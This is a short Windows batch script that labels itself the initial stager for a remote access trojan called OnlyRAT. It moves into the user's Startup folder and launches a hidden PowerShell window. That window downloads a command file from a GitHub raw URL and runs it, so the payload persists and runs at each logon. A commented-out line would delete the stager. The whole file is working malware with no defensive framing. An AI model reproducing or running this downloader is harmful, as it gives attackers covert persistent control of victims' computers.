@echo off
@REM initial stager for RAT

@REM variables
set "INITIALPATH=%cd%"
set "STARTUP=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"

@REM move into startup directory 
cd %STARTUP%

@REM write payloads to startup
powershell powershell.exe - windowstyle hidden "Invoke-WebRequest -Uri 'raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/files/wget.cmd' -OutFile 'wget.cmd'"

@REM run payload
powershell "./wget.cmd"

@REM cd back into initial location
cd "%INITIALPATH%"
@REM del initial.cmd
